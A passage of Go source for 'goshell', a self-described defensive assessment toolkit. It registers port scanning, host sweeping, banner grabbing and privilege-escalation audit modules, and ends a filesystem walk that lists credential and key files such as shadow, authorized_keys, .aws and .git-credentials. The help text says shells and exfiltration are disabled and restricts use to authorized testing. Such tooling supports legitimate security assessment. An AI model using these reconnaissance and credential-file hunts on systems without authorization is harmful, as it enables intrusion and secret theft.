		"web.config", "wp-config.php", "secrets.", "credentials",
		"authorized_keys", "shadow", "passwd", "known_hosts",
		".git-credentials", ".aws", ".kube", "docker.sock",
	}
	// skip pseudo filesystems that would waste the walk
	skipDirs := map[string]bool{"/proc": true, "/sys": true, "/dev": true}
	var count int
	err := filepath.WalkDir(*root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil // unreadable → skip silently
		}
		if d.IsDir() {
			if skipDirs[path] && path != *root {
				return filepath.SkipDir
			}
			return nil
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}
		name := strings.ToLower(d.Name())
		for _, p := range patterns {
			if strings.Contains(name, p) {
				info, ierr := d.Info()
				if ierr != nil {
					return nil
				}
				fmt.Printf("  %-70s %v\n", path, info.Mode())
				count++
				break
			}
		}
		return nil
	})
	if err != nil && !errors.Is(err, context.Canceled) {
		return err
	}
	fmt.Printf("\n%d sensitive/config file(s) exposed\n", count)
	return ctx.Err()
}

// ===========================================================================
// 13. registration & main
// ===========================================================================

func init() {
	// gather
	register("sysinfo", "gather", "system & network information", "goshell sysinfo", cmdSysInfo)
	register("users", "gather", "list local users", "goshell users", cmdListUsers)
	register("procs", "gather", "running processes", "goshell procs", cmdProcs)
	register("services", "gather", "installed/running services", "goshell services", cmdServices)
	register("netstat", "gather", "listening sockets & connections", "goshell netstat", cmdNetStat)
	register("route", "gather", "routing table", "goshell route", cmdRoute)
	// scan
	register("scan", "scan", "concurrent TCP port scanner", "goshell scan -h host -p 1-1024", cmdPortScan)
	register("sweep", "scan", "CIDR host discovery via common-port probes", "goshell sweep -c 10.0.0.0/24", cmdSweep)
	register("banner", "scan", "grab service banners from open ports", "goshell banner -h host -p 22,80", cmdBanner)
	// dns
	register("dnslookup", "dns", "resolve A/AAAA/MX/TXT/NS/CNAME/SRV", "goshell dnslookup example.com txt", cmdDNSLookup)
	register("revdns", "dns", "reverse DNS (PTR) lookups", "goshell revdns 8.8.8.8 1.1.1.1", cmdRevDNS)
	// recon
	register("httphead", "recon", "HTTP fingerprint: status, server, title", "goshell httphead example.com", cmdHTTPHead)
	register("download", "recon", "fetch a file over HTTP(S)", "goshell download -u URL -o out.bin", cmdDownload)
	// shell
	// pivot
	// utility
	register("http", "utility", "HTTP file server", "goshell http -dir . -p 8000", cmdHttpServe)
	register("hash", "utility", "MD5+SHA-256 of files", "goshell hash file1 file2", cmdHash)
	register("aes", "utility", "AES-256-GCM file encrypt/decrypt", "goshell aes -f data -p pass [-d]", cmdAES)
	register("zip", "utility", "create/extract zip archives", "goshell zip -a out.zip -dir . | -a in.zip -x", cmdZip)
	register("doctor", "utility", "self-test crypto/net/time/parsers", "goshell doctor", cmdDoctor)
	// privesc
	register("privesc", "privesc", "privilege-escalation audit checks", "goshell privesc", cmdPrivesc)
	register("tasks", "privesc", "scheduled tasks / cron audit", "goshell tasks", cmdTasks)
	register("fw", "privesc", "firewall rules audit", "goshell fw", cmdFirewall)
	// filesystem
	register("hunt", "filesystem", "find exposed sensitive/config files (paths only)", "goshell hunt -r /", cmdHunt)
}

func help() {
	fmt.Printf("goshell %s — defensive assessment toolkit (22 modules, single binary, stdlib only)\n\n", version)
	fmt.Println("usage: goshell [-config file.json] <command> [flags]")
	fmt.Println()
	order, cats := modulesByCategory()
	for _, c := range order {
		fmt.Printf("[%s]\n", c)
		for _, m := range cats[c] {
			fmt.Printf("  %-12s %-56s %s\n", m.Name(), m.Usage(), m.Desc())
		}
		fmt.Println()
	}
	fmt.Println("Longevity: TLS 1.2+ only (RFC 8996), dual-stack IPv4/IPv6, 64-bit RFC3339")
	fmt.Println("time, context cancellation everywhere, zero third-party dependencies.")
	fmt.Println("Interactive remote shells, open proxies, relays, and exfiltration helpers are disabled in this hardened build.")
	fmt.Println("Authorized testing only.")
}

func main() {
	fs := flag.NewFlagSet("goshell", flag.ContinueOnError)
	cfgPath := fs.String("config", os.Getenv("GOSHELL_CONFIG"), "JSON config file (env: GOSHELL_CONFIG)")
	if err := fs.Parse(os.Args[1:]); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(2)
	}
	rest := fs.Args()
	if len(rest) == 0 {
		help()
		return
	}
	cmd := rest[0]
	switch cmd {
	case "help", "-h", "--help":
		help()
		return
	case "version", "-v", "--version":
		fmt.Println("goshell", version)
		return
	}
	m := findModule(cmd)
	if m == nil {
		fmt.Fprintf(os.Stderr, "unknown command %q\n\n", cmd)
		help()
		os.Exit(1)
	}
	cfg, err := loadConfig(*cfgPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "config error: %v (defaults in use)\n", err)
	}
	ctx, cancel := rootContext()
	defer cancel()
	if err := m.Run(ctx, cfg, rest[1:]); err != nil && !errors.Is(err, context.Canceled) {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}
